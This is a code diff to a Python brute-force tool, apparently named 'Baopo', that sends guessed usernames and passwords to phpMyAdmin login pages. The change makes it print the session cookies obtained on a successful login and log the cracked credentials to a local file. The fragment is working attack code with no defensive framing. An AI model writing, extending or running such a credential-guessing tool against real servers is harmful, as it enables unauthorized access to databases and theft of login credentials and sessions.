@@ -49,7 +49,8 @@ class Baopo:
                 data={'pma_username':self.username,'pma_password':self.password,'server':'1','target':'index.php','token':tokens.group()}
                 rv=session.post(url=x,headers=headers,data=data)
                 if not 'pma_password' in rv.text:
-                    print('[+] IP:{} 爆破成功 用户名:{} 密码:{}'.format(rv.url,self.username,self.password))
+                    print('[+] IP:{} 爆破成功 用户名:{} 密码:{} cookie:{}'.format(rv.url,self.username,self.password,rv.cookies))
+                    print('[+] IP:{} 爆破成功 用户名:{} 密码:{}'.format(rv.url,self.username,self.password),file=open('save.txt','a',encoding='utf-8'))
             except Exception as r:
                 print('[-] Error {}'.format(r))
 
